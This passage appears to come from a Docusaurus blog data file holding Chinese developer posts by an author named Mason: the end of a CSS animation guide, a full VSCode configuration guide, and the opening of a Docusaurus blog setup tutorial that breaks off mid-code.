1, 3, infinite |\\n| `direction` | \u64ad\u653e\u65b9\u5411 | normal, reverse, alternate |\\n| `fill-mode` | \u586b\u5145\u6a21\u5f0f | forwards, backwards, both |\\n| `play-state` | \u64ad\u653e\u72b6\u6001 | running, paused |\\n\\n### \u5e38\u7528\u52a8\u753b\\n\\n```css\\n/* \u6de1\u5165 */\\n@keyframes fadeIn {\\n  from { opacity: 0; }\\n  to { opacity: 1; }\\n}\\n\\n/* \u6de1\u5165\u4e0a\u79fb */\\n@keyframes fadeInUp {\\n  from {\\n    opacity: 0;\\n    transform: translateY(20px);\\n  }\\n  to {\\n    opacity: 1;\\n    transform: translateY(0);\\n  }\\n}\\n\\n/* \u7f29\u653e\u5f39\u8df3 */\\n@keyframes bounce {\\n  0%, 100% { transform: scale(1); }\\n  50% { transform: scale(1.1); }\\n}\\n\\n/* \u65cb\u8f6c */\\n@keyframes spin {\\n  from { transform: rotate(0deg); }\\n  to { transform: rotate(360deg); }\\n}\\n\\n/* \u8109\u51b2 */\\n@keyframes pulse {\\n  0%, 100% { opacity: 1; }\\n  50% { opacity: 0.5; }\\n}\\n\\n/* \u6447\u6643 */\\n@keyframes shake {\\n  0%, 100% { transform: translateX(0); }\\n  25% { transform: translateX(-5px); }\\n  75% { transform: translateX(5px); }\\n}\\n```\\n\\n### \u4f7f\u7528\u793a\u4f8b\\n\\n```css\\n/* \u52a0\u8f7d\u52a8\u753b */\\n.spinner {\\n  width: 40px;\\n  height: 40px;\\n  border: 3px solid #f3f3f3;\\n  border-top: 3px solid #3b82f6;\\n  border-radius: 50%;\\n  animation: spin 1s linear infinite;\\n}\\n\\n/* \u5165\u573a\u52a8\u753b */\\n.card {\\n  animation: fadeInUp 0.6s ease forwards;\\n}\\n\\n/* \u5ef6\u8fdf\u5165\u573a */\\n.card:nth-child(1) { animation-delay: 0.1s; }\\n.card:nth-child(2) { animation-delay: 0.2s; }\\n.card:nth-child(3) { animation-delay: 0.3s; }\\n```\\n\\n---\\n\\n## \u26a1 \u6027\u80fd\u4f18\u5316\\n\\n### \u53ea\u52a8\u753b\u8fd9\u4e9b\u5c5e\u6027\\n\\n```css\\n/* \u2705 \u9ad8\u6027\u80fd - \u4f7f\u7528 GPU \u52a0\u901f */\\ntransform: translate(), scale(), rotate();\\nopacity: 0 ~ 1;\\n\\n/* \u274c \u4f4e\u6027\u80fd - \u89e6\u53d1\u91cd\u6392 */\\nwidth, height, margin, padding, top, left, right, bottom\\n```\\n\\n### \u5f00\u542f GPU \u52a0\u901f\\n\\n```css\\n.element {\\n  /* \u89e6\u53d1\u786c\u4ef6\u52a0\u901f */\\n  transform: translateZ(0);\\n  /* \u6216 */\\n  will-change: transform, opacity;\\n}\\n```\\n\\n### will-change \u4f7f\u7528\u6ce8\u610f\\n\\n```css\\n/* \u2705 \u6b63\u786e\uff1a\u60ac\u6d6e\u65f6\u63d0\u524d\u544a\u77e5 */\\n.card:hover {\\n  will-change: transform;\\n}\\n\\n/* \u274c \u9519\u8bef\uff1a\u4e0d\u8981\u6ee5\u7528 */\\n* { will-change: all; }\\n```\\n\\n### \u51cf\u5c11\u91cd\u6392\\n\\n```css\\n/* \u274c \u89e6\u53d1\u91cd\u6392 */\\n.bad {\\n  animation: moveLeft 1s;\\n}\\n@keyframes moveLeft {\\n  to { left: 100px; }\\n}\\n\\n/* \u2705 \u4f7f\u7528 transform */\\n.good {\\n  animation: moveLeft 1s;\\n}\\n@keyframes moveLeft {\\n  to { transform: translateX(100px); }\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfaf \u5b9e\u6218\u6848\u4f8b\\n\\n### 1. \u6309\u94ae\u6d9f\u6f2a\u6548\u679c\\n\\n```css\\n.ripple-button {\\n  position: relative;\\n  overflow: hidden;\\n}\\n\\n.ripple-button::after {\\n  content: \'\';\\n  position: absolute;\\n  width: 100%;\\n  height: 100%;\\n  top: 0;\\n  left: 0;\\n  background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 60%);\\n  transform: scale(0);\\n  opacity: 0;\\n}\\n\\n.ripple-button:active::after {\\n  transform: scale(2);\\n  opacity: 1;\\n  transition: transform 0.5s, opacity 0.3s;\\n}\\n```\\n\\n### 2. \u9aa8\u67b6\u5c4f\u52a0\u8f7d\\n\\n```css\\n.skeleton {\\n  background: linear-gradient(\\n    90deg,\\n    #f0f0f0 25%,\\n    #e0e0e0 50%,\\n    #f0f0f0 75%\\n  );\\n  background-size: 200% 100%;\\n  animation: shimmer 1.5s infinite;\\n}\\n\\n@keyframes shimmer {\\n  0% { background-position: 200% 0; }\\n  100% { background-position: -200% 0; }\\n}\\n```\\n\\n### 3. \u6253\u5b57\u673a\u6548\u679c\\n\\n```css\\n.typewriter {\\n  overflow: hidden;\\n  border-right: 2px solid;\\n  white-space: nowrap;\\n  animation: \\n    typing 3s steps(20) forwards,\\n    blink 0.5s step-end infinite;\\n}\\n\\n@keyframes typing {\\n  from { width: 0; }\\n  to { width: 100%; }\\n}\\n\\n@keyframes blink {\\n  50% { border-color: transparent; }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [Animate.css](https://animate.style/) - \u9884\u8bbe\u52a8\u753b\u5e93\\n- [Cubic Bezier](https://cubic-bezier.com/) - \u8d1d\u585e\u5c14\u66f2\u7ebf\u53ef\u89c6\u5316\\n- [CSS Triggers](https://csstriggers.com/) - \u5c5e\u6027\u6027\u80fd\u53c2\u8003\\n\\n---\\n\\n\u52a8\u753b\u80fd\u5927\u5e45\u63d0\u5347\u7528\u6237\u4f53\u9a8c\uff0c\u4f46\u8981\u6ce8\u610f\u6027\u80fd\u548c\u9002\u5ea6\u4f7f\u7528\u3002\u8bb0\u4f4f\uff1a**\u5c11\u5373\u662f\u591a**\u3002"},{"id":"vscode-setup","metadata":{"permalink":"/blog/vscode-setup","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-03-15-vscode-setup.md","source":"@site/blog/2024-03-15-vscode-setup.md","title":"VSCode \u9ad8\u6548\u5f00\u53d1\u914d\u7f6e\u6307\u5357","description":"\u5de5\u6b32\u5584\u5176\u4e8b\uff0c\u5fc5\u5148\u5229\u5176\u5668\u3002\u672c\u6587\u5206\u4eab\u6211\u7684 VSCode \u914d\u7f6e\uff0c\u5e2e\u52a9\u4f60\u6253\u9020\u9ad8\u6548\u7684\u5f00\u53d1\u73af\u5883\u3002","date":"2024-03-15T00:00:00.000Z","tags":[{"inline":true,"label":"VSCode","permalink":"/blog/tags/vs-code"},{"inline":true,"label":"\u5de5\u5177","permalink":"/blog/tags/\u5de5\u5177"},{"inline":true,"label":"\u6548\u7387","permalink":"/blog/tags/\u6548\u7387"}],"readingTime":3.96,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"vscode-setup","title":"VSCode \u9ad8\u6548\u5f00\u53d1\u914d\u7f6e\u6307\u5357","authors":"mason","tags":["VSCode","\u5de5\u5177","\u6548\u7387"]},"unlisted":false,"prevItem":{"title":"CSS \u52a8\u753b\u4e0e\u8fc7\u6e21\u6548\u679c\u5b9e\u6218","permalink":"/blog/css-animation"},"nextItem":{"title":"\u4ece 0 \u5230 1 \u642d\u5efa Docusaurus \u535a\u5ba2","permalink":"/blog/build-docusaurus-blog"}},"content":"\u5de5\u6b32\u5584\u5176\u4e8b\uff0c\u5fc5\u5148\u5229\u5176\u5668\u3002\u672c\u6587\u5206\u4eab\u6211\u7684 VSCode \u914d\u7f6e\uff0c\u5e2e\u52a9\u4f60\u6253\u9020\u9ad8\u6548\u7684\u5f00\u53d1\u73af\u5883\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfa8 \u4e3b\u9898\u4e0e\u5916\u89c2\\n\\n### \u63a8\u8350\u4e3b\u9898\\n\\n| \u4e3b\u9898 | \u7279\u70b9 |\\n|------|------|\\n| **One Dark Pro** | \u7ecf\u5178\u6697\u8272\u4e3b\u9898 |\\n| **GitHub Theme** | GitHub \u98ce\u683c |\\n| **Dracula** | \u9ad8\u5bf9\u6bd4\u5ea6\u6697\u8272 |\\n| **Catppuccin** | \u67d4\u548c\u7684\u6697\u8272\u7cfb |\\n\\n### \u63a8\u8350\u56fe\u6807\\n\\n- **Material Icon Theme** - \u4e30\u5bcc\u7684\u6587\u4ef6\u56fe\u6807\\n- **vscode-icons** - \u53e6\u4e00\u4e2a\u4f18\u79c0\u9009\u62e9\\n\\n### \u5b57\u4f53\u63a8\u8350\\n\\n```json\\n{\\n  \\"editor.fontFamily\\": \\"JetBrains Mono, Fira Code, Consolas\\",\\n  \\"editor.fontLigatures\\": true,\\n  \\"editor.fontSize\\": 14,\\n  \\"editor.lineHeight\\": 1.6\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd0c \u5fc5\u88c5\u63d2\u4ef6\\n\\n### \u901a\u7528\u5f00\u53d1\\n\\n| \u63d2\u4ef6 | \u529f\u80fd |\\n|------|------|\\n| **ESLint** | JavaScript/TypeScript \u4ee3\u7801\u68c0\u67e5 |\\n| **Prettier** | \u4ee3\u7801\u683c\u5f0f\u5316 |\\n| **GitLens** | Git \u589e\u5f3a\uff0c\u67e5\u770b\u4ee3\u7801\u5386\u53f2 |\\n| **Error Lens** | \u884c\u5185\u663e\u793a\u9519\u8bef\u4fe1\u606f |\\n| **Path Intellisense** | \u8def\u5f84\u81ea\u52a8\u8865\u5168 |\\n| **Auto Rename Tag** | \u81ea\u52a8\u91cd\u547d\u540d\u914d\u5bf9\u6807\u7b7e |\\n\\n### \u524d\u7aef\u5f00\u53d1\\n\\n| \u63d2\u4ef6 | \u529f\u80fd |\\n|------|------|\\n| **ES7+ React Snippets** | React \u4ee3\u7801\u7247\u6bb5 |\\n| **Tailwind CSS IntelliSense** | Tailwind \u667a\u80fd\u63d0\u793a |\\n| **CSS Peek** | CSS \u5b9a\u4e49\u8df3\u8f6c |\\n| **Import Cost** | \u663e\u793a\u5bfc\u5165\u5305\u5927\u5c0f |\\n| **Console Ninja** | \u63a7\u5236\u53f0\u65e5\u5fd7\u589e\u5f3a |\\n\\n### \u6548\u7387\u63d0\u5347\\n\\n| \u63d2\u4ef6 | \u529f\u80fd |\\n|------|------|\\n| **GitHub Copilot** | AI \u4ee3\u7801\u8865\u5168 |\\n| **Code Spell Checker** | \u62fc\u5199\u68c0\u67e5 |\\n| **Todo Tree** | TODO \u6ce8\u91ca\u7ba1\u7406 |\\n| **Bookmarks** | \u4ee3\u7801\u4e66\u7b7e |\\n| **Project Manager** | \u9879\u76ee\u5feb\u901f\u5207\u6362 |\\n\\n---\\n\\n## \u2699\ufe0f \u6838\u5fc3\u914d\u7f6e\\n\\n### settings.json\\n\\n```json\\n{\\n  // \u7f16\u8f91\u5668\\n  \\"editor.fontSize\\": 14,\\n  \\"editor.tabSize\\": 2,\\n  \\"editor.wordWrap\\": \\"on\\",\\n  \\"editor.minimap.enabled\\": false,\\n  \\"editor.cursorBlinking\\": \\"smooth\\",\\n  \\"editor.cursorSmoothCaretAnimation\\": \\"on\\",\\n  \\"editor.smoothScrolling\\": true,\\n  \\"editor.bracketPairColorization.enabled\\": true,\\n  \\"editor.guides.bracketPairs\\": \\"active\\",\\n  \\"editor.stickyScroll.enabled\\": true,\\n  \\n  // \u4fdd\u5b58\u65f6\u683c\u5f0f\u5316\\n  \\"editor.formatOnSave\\": true,\\n  \\"editor.defaultFormatter\\": \\"esbenp.prettier-vscode\\",\\n  \\"editor.codeActionsOnSave\\": {\\n    \\"source.fixAll.eslint\\": \\"explicit\\",\\n    \\"source.organizeImports\\": \\"explicit\\"\\n  },\\n  \\n  // \u6587\u4ef6\\n  \\"files.autoSave\\": \\"afterDelay\\",\\n  \\"files.autoSaveDelay\\": 1000,\\n  \\"files.trimTrailingWhitespace\\": true,\\n  \\"files.insertFinalNewline\\": true,\\n  \\n  // \u7ec8\u7aef\\n  \\"terminal.integrated.fontSize\\": 13,\\n  \\"terminal.integrated.cursorStyle\\": \\"line\\",\\n  \\n  // \u641c\u7d22\\n  \\"search.exclude\\": {\\n    \\"**/node_modules\\": true,\\n    \\"**/dist\\": true,\\n    \\"**/build\\": true\\n  },\\n  \\n  // Git\\n  \\"git.autofetch\\": true,\\n  \\"git.confirmSync\\": false,\\n  \\"git.enableSmartCommit\\": true\\n}\\n```\\n\\n### \u8bed\u8a00\u7279\u5b9a\u914d\u7f6e\\n\\n```json\\n{\\n  \\"[javascript]\\": {\\n    \\"editor.defaultFormatter\\": \\"esbenp.prettier-vscode\\"\\n  },\\n  \\"[typescript]\\": {\\n    \\"editor.defaultFormatter\\": \\"esbenp.prettier-vscode\\"\\n  },\\n  \\"[typescriptreact]\\": {\\n    \\"editor.defaultFormatter\\": \\"esbenp.prettier-vscode\\"\\n  },\\n  \\"[json]\\": {\\n    \\"editor.defaultFormatter\\": \\"esbenp.prettier-vscode\\"\\n  },\\n  \\"[markdown]\\": {\\n    \\"editor.wordWrap\\": \\"on\\",\\n    \\"editor.quickSuggestions\\": false\\n  }\\n}\\n```\\n\\n---\\n\\n## \u2328\ufe0f \u5e38\u7528\u5feb\u6377\u952e\\n\\n### \u57fa\u7840\u64cd\u4f5c\\n\\n| \u5feb\u6377\u952e | \u529f\u80fd |\\n|--------|------|\\n| `Cmd/Ctrl + P` | \u5feb\u901f\u6253\u5f00\u6587\u4ef6 |\\n| `Cmd/Ctrl + Shift + P` | \u547d\u4ee4\u9762\u677f |\\n| `Cmd/Ctrl + B` | \u5207\u6362\u4fa7\u8fb9\u680f |\\n| `Cmd/Ctrl + J` | \u5207\u6362\u7ec8\u7aef |\\n| `Cmd/Ctrl + \\\\`` | \u65b0\u5efa\u7ec8\u7aef |\\n\\n### \u7f16\u8f91\u64cd\u4f5c\\n\\n| \u5feb\u6377\u952e | \u529f\u80fd |\\n|--------|------|\\n| `Cmd/Ctrl + D` | \u9009\u4e2d\u4e0b\u4e00\u4e2a\u76f8\u540c\u8bcd |\\n| `Cmd/Ctrl + Shift + L` | \u9009\u4e2d\u6240\u6709\u76f8\u540c\u8bcd |\\n| `Alt + \u2191/\u2193` | \u79fb\u52a8\u5f53\u524d\u884c |\\n| `Alt + Shift + \u2191/\u2193` | \u590d\u5236\u5f53\u524d\u884c |\\n| `Cmd/Ctrl + Shift + K` | \u5220\u9664\u5f53\u524d\u884c |\\n| `Cmd/Ctrl + /` | \u5207\u6362\u6ce8\u91ca |\\n| `Cmd/Ctrl + Shift + [/]` | \u6298\u53e0/\u5c55\u5f00\u4ee3\u7801\u5757 |\\n\\n### \u5bfc\u822a\\n\\n| \u5feb\u6377\u952e | \u529f\u80fd |\\n|--------|------|\\n| `Cmd/Ctrl + G` | \u8df3\u8f6c\u5230\u6307\u5b9a\u884c |\\n| `Cmd/Ctrl + Shift + O` | \u8df3\u8f6c\u5230\u7b26\u53f7 |\\n| `F12` | \u8df3\u8f6c\u5230\u5b9a\u4e49 |\\n| `Shift + F12` | \u67e5\u770b\u5f15\u7528 |\\n| `Cmd/Ctrl + -` | \u8fd4\u56de\u4e0a\u4e00\u4e2a\u4f4d\u7f6e |\\n\\n### \u591a\u5149\u6807\\n\\n| \u5feb\u6377\u952e | \u529f\u80fd |\\n|--------|------|\\n| `Alt + Click` | \u6dfb\u52a0\u5149\u6807 |\\n| `Cmd/Ctrl + Alt + \u2191/\u2193` | \u4e0a\u4e0b\u6dfb\u52a0\u5149\u6807 |\\n| `Cmd/Ctrl + Shift + L` | \u6240\u6709\u5339\u914d\u9879\u6dfb\u52a0\u5149\u6807 |\\n\\n---\\n\\n## \ud83d\udcdd \u4ee3\u7801\u7247\u6bb5\\n\\n### \u81ea\u5b9a\u4e49 Snippets\\n\\n```json\\n// .vscode/snippets.code-snippets\\n{\\n  \\"React Functional Component\\": {\\n    \\"prefix\\": \\"rfc\\",\\n    \\"body\\": [\\n      \\"interface ${1:$TM_FILENAME_BASE}Props {\\",\\n      \\"  $2\\",\\n      \\"}\\",\\n      \\"\\",\\n      \\"export default function ${1:$TM_FILENAME_BASE}({ $3 }: ${1:$TM_FILENAME_BASE}Props) {\\",\\n      \\"  return (\\",\\n      \\"    <div>\\",\\n      \\"      $0\\",\\n      \\"    </div>\\",\\n      \\"  );\\",\\n      \\"}\\"\\n    ]\\n  },\\n  \\"Console Log\\": {\\n    \\"prefix\\": \\"cl\\",\\n    \\"body\\": \\"console.log(\'$1:\', $1);$0\\"\\n  },\\n  \\"useState Hook\\": {\\n    \\"prefix\\": \\"us\\",\\n    \\"body\\": \\"const [$1, set${1/(.*)/${1:/capitalize}/}] = useState($2);$0\\"\\n  },\\n  \\"useEffect Hook\\": {\\n    \\"prefix\\": \\"ue\\",\\n    \\"body\\": [\\n      \\"useEffect(() => {\\",\\n      \\"  $1\\",\\n      \\"}, [$0]);\\"\\n    ]\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u5de5\u4f5c\u533a\u914d\u7f6e\\n\\n### .vscode/settings.json\\n\\n\u9488\u5bf9\u9879\u76ee\u7684\u914d\u7f6e\uff1a\\n\\n```json\\n{\\n  \\"editor.tabSize\\": 2,\\n  \\"editor.formatOnSave\\": true,\\n  \\"typescript.preferences.importModuleSpecifier\\": \\"relative\\",\\n  \\"files.exclude\\": {\\n    \\"**/.git\\": true,\\n    \\"**/node_modules\\": true\\n  }\\n}\\n```\\n\\n### .vscode/extensions.json\\n\\n\u63a8\u8350\u56e2\u961f\u5b89\u88c5\u7684\u63d2\u4ef6\uff1a\\n\\n```json\\n{\\n  \\"recommendations\\": [\\n    \\"dbaeumer.vscode-eslint\\",\\n    \\"esbenp.prettier-vscode\\",\\n    \\"bradlc.vscode-tailwindcss\\"\\n  ]\\n}\\n```\\n\\n### .vscode/launch.json\\n\\n\u8c03\u8bd5\u914d\u7f6e\uff1a\\n\\n```json\\n{\\n  \\"version\\": \\"0.2.0\\",\\n  \\"configurations\\": [\\n    {\\n      \\"name\\": \\"Debug Chrome\\",\\n      \\"type\\": \\"chrome\\",\\n      \\"request\\": \\"launch\\",\\n      \\"url\\": \\"http://localhost:3000\\",\\n      \\"webRoot\\": \\"${workspaceFolder}/src\\"\\n    },\\n    {\\n      \\"name\\": \\"Debug Node\\",\\n      \\"type\\": \\"node\\",\\n      \\"request\\": \\"launch\\",\\n      \\"program\\": \\"${workspaceFolder}/src/index.js\\"\\n    }\\n  ]\\n}\\n```\\n\\n---\\n\\n## \ud83d\udca1 \u6548\u7387\u6280\u5de7\\n\\n### 1. \u547d\u4ee4\u9762\u677f\u4e07\u80fd\u952e\\n\\n`Cmd/Ctrl + Shift + P` \u53ef\u4ee5\u6267\u884c\u51e0\u4e4e\u6240\u6709\u64cd\u4f5c\uff1a\\n\\n- `>Reload Window` - \u91cd\u8f7d\u7a97\u53e3\\n- `>Format Document` - \u683c\u5f0f\u5316\u6587\u6863\\n- `>Transform to Uppercase` - \u8f6c\u5927\u5199\\n- `>Sort Lines Ascending` - \u884c\u6392\u5e8f\\n\\n### 2. Emmet \u5feb\u901f\u7f16\u5199 HTML\\n\\n```\\ndiv.container>ul>li*3>a[href=\\"#\\"]\\n```\\n\\n\u751f\u6210\uff1a\\n\\n```html\\n<div class=\\"container\\">\\n  <ul>\\n    <li><a href=\\"#\\"></a></li>\\n    <li><a href=\\"#\\"></a></li>\\n    <li><a href=\\"#\\"></a></li>\\n  </ul>\\n</div>\\n```\\n\\n### 3. \u591a\u6587\u4ef6\u641c\u7d22\u66ff\u6362\\n\\n1. `Cmd/Ctrl + Shift + H` \u6253\u5f00\u641c\u7d22\u66ff\u6362\\n2. \u8f93\u5165\u641c\u7d22\u5185\u5bb9\u548c\u66ff\u6362\u5185\u5bb9\\n3. \u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\\n4. \u9884\u89c8\u540e\u6279\u91cf\u66ff\u6362\\n\\n### 4. \u6587\u4ef6\u5bf9\u6bd4\\n\\n```bash\\n# \u547d\u4ee4\u884c\u6253\u5f00\u5bf9\u6bd4\\ncode --diff file1.js file2.js\\n```\\n\\n\u6216\u5728 VSCode \u4e2d\uff1a\\n1. \u9009\u4e2d\u4e24\u4e2a\u6587\u4ef6\\n2. \u53f3\u952e\u9009\u62e9 \\"Compare Selected\\"\\n\\n### 5. \u7ec8\u7aef\u5206\u5c4f\\n\\n- `Cmd/Ctrl + \\\\` \u5728\u7ec8\u7aef\u4e2d\u65b0\u5efa\u5206\u5c4f\\n- \u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u547d\u4ee4\\n\\n---\\n\\n## \ud83d\udccb \u914d\u7f6e\u540c\u6b65\\n\\n### \u4f7f\u7528\u5185\u7f6e\u540c\u6b65\\n\\n1. \u767b\u5f55 GitHub/Microsoft \u8d26\u53f7\\n2. \u6253\u5f00 Settings Sync\\n3. \u9009\u62e9\u8981\u540c\u6b65\u7684\u5185\u5bb9\\n\\n### \u624b\u52a8\u5bfc\u51fa\u914d\u7f6e\\n\\n```bash\\n# \u5bfc\u51fa\u63d2\u4ef6\u5217\u8868\\ncode --list-extensions > extensions.txt\\n\\n# \u6279\u91cf\u5b89\u88c5\\ncat extensions.txt | xargs -L 1 code --install-extension\\n```\\n\\n---\\n\\n\u597d\u7684\u5de5\u5177\u914d\u7f6e\u80fd\u5927\u5e45\u63d0\u5347\u5f00\u53d1\u6548\u7387\u3002\u82b1\u4e00\u70b9\u65f6\u95f4\u4f18\u5316\u4f60\u7684\u5f00\u53d1\u73af\u5883\uff0c\u957f\u671f\u6765\u770b\u662f\u975e\u5e38\u503c\u5f97\u7684\u6295\u8d44\u3002\\n\\n\u4f60\u6709\u4ec0\u4e48\u72ec\u7279\u7684 VSCode \u914d\u7f6e\u6280\u5de7\u5417\uff1f\u6b22\u8fce\u5728\u8bc4\u8bba\u533a\u5206\u4eab\uff01"},{"id":"build-docusaurus-blog","metadata":{"permalink":"/blog/build-docusaurus-blog","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-03-01-docusaurus-blog.md","source":"@site/blog/2024-03-01-docusaurus-blog.md","title":"\u4ece 0 \u5230 1 \u642d\u5efa Docusaurus \u535a\u5ba2","description":"\u8fd9\u7bc7\u6587\u7ae0\u8bb0\u5f55\u4e86\u6211\u642d\u5efa\u8fd9\u4e2a\u535a\u5ba2\u7684\u5b8c\u6574\u8fc7\u7a0b\uff0c\u5305\u62ec\u521d\u59cb\u5316\u3001\u81ea\u5b9a\u4e49\u4e3b\u9898\u3001\u529f\u80fd\u589e\u5f3a\u548c\u90e8\u7f72\u4e0a\u7ebf\u3002","date":"2024-03-01T00:00:00.000Z","tags":[{"inline":true,"label":"Docusaurus","permalink":"/blog/tags/docusaurus"},{"inline":true,"label":"\u535a\u5ba2","permalink":"/blog/tags/\u535a\u5ba2"},{"inline":true,"label":"\u6559\u7a0b","permalink":"/blog/tags/\u6559\u7a0b"}],"readingTime":4.29,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"build-docusaurus-blog","title":"\u4ece 0 \u5230 1 \u642d\u5efa Docusaurus \u535a\u5ba2","authors":"mason","tags":["Docusaurus","\u535a\u5ba2","\u6559\u7a0b"]},"unlisted":false,"prevItem":{"title":"VSCode \u9ad8\u6548\u5f00\u53d1\u914d\u7f6e\u6307\u5357","permalink":"/blog/vscode-setup"},"nextItem":{"title":"JavaScript \u5f02\u6b65\u7f16\u7a0b\u8fdb\u9636","permalink":"/blog/async-javascript"}},"content":"\u8fd9\u7bc7\u6587\u7ae0\u8bb0\u5f55\u4e86\u6211\u642d\u5efa\u8fd9\u4e2a\u535a\u5ba2\u7684\u5b8c\u6574\u8fc7\u7a0b\uff0c\u5305\u62ec\u521d\u59cb\u5316\u3001\u81ea\u5b9a\u4e49\u4e3b\u9898\u3001\u529f\u80fd\u589e\u5f3a\u548c\u90e8\u7f72\u4e0a\u7ebf\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e3a\u4ec0\u4e48\u9009\u62e9 Docusaurus\\n\\n\u5728\u4f17\u591a\u9759\u6001\u7f51\u7ad9\u751f\u6210\u5668\u4e2d\uff0c\u6211\u9009\u62e9 Docusaurus \u7684\u539f\u56e0\uff1a\\n\\n| \u7279\u6027 | \u8bf4\u660e |\\n|------|------|\\n| React \u6280\u672f\u6808 | \u719f\u6089\u7684\u5f00\u53d1\u4f53\u9a8c |\\n| \u6587\u6863 + \u535a\u5ba2 | \u4e00\u7ad9\u5f0f\u89e3\u51b3\u65b9\u6848 |\\n| MDX \u652f\u6301 | Markdown \u4e2d\u4f7f\u7528 React \u7ec4\u4ef6 |\\n| \u63d2\u4ef6\u751f\u6001 | \u4e30\u5bcc\u7684\u5b98\u65b9\u548c\u793e\u533a\u63d2\u4ef6 |\\n| \u7248\u672c\u7ba1\u7406 | \u6587\u6863\u591a\u7248\u672c\u652f\u6301 |\\n| i18n | \u5185\u7f6e\u56fd\u9645\u5316\u65b9\u6848 |\\n\\n---\\n\\n## \ud83d\ude80 \u5feb\u901f\u5f00\u59cb\\n\\n### 1. \u521d\u59cb\u5316\u9879\u76ee\\n\\n```bash\\nnpx create-docusaurus@latest my-blog classic --typescript\\ncd my-blog\\nyarn start\\n```\\n\\n### 2. \u9879\u76ee\u7ed3\u6784\\n\\n```\\nmy-blog/\\n\u251c\u2500\u2500 blog/                 # \u535a\u5ba2\u6587\u7ae0\\n\u251c\u2500\u2500 docs/                 # \u6587\u6863\\n\u251c\u2500\u2500 src/\\n\u2502   \u251c\u2500\u2500 components/       # \u81ea\u5b9a\u4e49\u7ec4\u4ef6\\n\u2502   \u251c\u2500\u2500 css/              # \u5168\u5c40\u6837\u5f0f\\n\u2502   \u2514\u2500\u2500 pages/            # \u81ea\u5b9a\u4e49\u9875\u9762\\n\u251c\u2500\u2500 static/               # \u9759\u6001\u8d44\u6e90\\n\u251c\u2500\u2500 docusaurus.config.ts  # \u4e3b\u914d\u7f6e\u6587\u4ef6\\n\u2514\u2500\u2500 sidebars.ts           # \u4fa7\u8fb9\u680f\u914d\u7f6e\\n```\\n\\n### 3. \u57fa\u7840\u914d\u7f6e\\n\\n```typescript\\n// docusaurus.config.ts\\nconst config: Config = {\\n  title: \'My Blog\',\\n  tagline: \'\u63a2\u7d22\u6280\u672f\u7684\u65e0\u9650\u53ef\u80fd\',\\n  url: \'https://your-domain.com\',\\n  baseUrl: \'/\',\\n  \\n  themeConfig: {\\n    navbar: {\\n      title: \'My Blog\',\\n      logo: { src: \'img/logo.svg\' },\\n      items: [\\n        { to: \'/docs\', label: \'Docs\' },\\n        { to: \'/blog\', label: \'Blog\' },\\n        { href: \'https://github.com/xxx\', label: \'GitHub\' },\\n      ],\\n    },\\n    footer: {\\n      style: \'dark\',\\n      copyright: `Copyright \xa9 ${new Date().getFullYear()}`,\\n    },\\n  },\\n};\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u81ea\u5b9a\u4e49\u4e3b\u9898\\n\\n### 1. \u81ea\u5b9a\u4e49\u989c\u8272\\n\\n```css\\n/* src/css/custom.css */\\n:root {\\n  --ifm-color-primary: #00d4aa;\\n  --ifm-color-primary-dark: #00bf99;\\n  --ifm-color-primary-darker: #00b391;\\n  --ifm-color-primary-darkest: #009477;\\n  --ifm-color-primary-light: #00e9bb;\\n  --ifm-color-primary-lighter: #00f5c7;\\n  --ifm-color-primary-lightest: #19ffe0;\\n  \\n  --ifm-font-family-base: \'Inter\', system-ui, sans-serif;\\n  --ifm-code-font-size: 95%;\\n}\\n\\n[data-theme=\'dark\'] {\\n  --ifm-color-primary: #00ffc8;\\n  --ifm-background-color: #0a0a0f;\\n}\\n```\\n\\n### 2. \u81ea\u5b9a\u4e49\u9996\u9875\\n\\n```tsx\\n// src/pages/index.tsx\\nexport default function Home() {\\n  return (\\n    <Layout>\\n      <header className={styles.hero}>\\n        <h1>Welcome to My Blog</h1>\\n        <p>\u63a2\u7d22\u6280\u672f\u7684\u65e0\u9650\u53ef\u80fd</p>\\n        <Link to=\\"/docs\\" className=\\"button button--primary\\">\\n          \u5f00\u59cb\u9605\u8bfb\\n        </Link>\\n      </header>\\n      <main>\\n        <HomepageFeatures />\\n      </main>\\n    </Layout>\\n  );\\n}\\n```\\n\\n### 3. \u81ea\u5b9a\u4e49 Logo\\n\\n\u521b\u5efa SVG Logo \u653e\u5728 `static/img/logo.svg`\uff0c\u5728\u914d\u7f6e\u4e2d\u5f15\u7528\u5373\u53ef\u3002\\n\\n---\\n\\n## \u2728 \u529f\u80fd\u589e\u5f3a\\n\\n### 1. \u672c\u5730\u641c\u7d22\\n\\n```bash\\nyarn add @easyops-cn/docusaurus-search-local\\n```\\n\\n```typescript\\n// docusaurus.config.ts\\nthemes: [\\n  [\\n    \'@easyops-cn/docusaurus-search-local\',\\n    {\\n      hashed: true,\\n      language: [\'en\', \'zh\'],\\n      highlightSearchTermsOnTargetPage: true,\\n    },\\n  ],\\n],\\n```\\n\\n### 2. \u8bc4\u8bba\u7cfb\u7edf\uff08Giscus\uff09\\n\\n```bash\\nyarn add @giscus/react\\n```\\n\\n```tsx\\n// src/components/GiscusComments/index.tsx\\nimport Giscus from \'@giscus/react\';\\nimport { useColorMode } from \'@docusaurus/theme-common\';\\nimport BrowserOnly from \'@docusaurus/BrowserOnly\';\\n\\nexport default function GiscusComments() {\\n  return (\\n    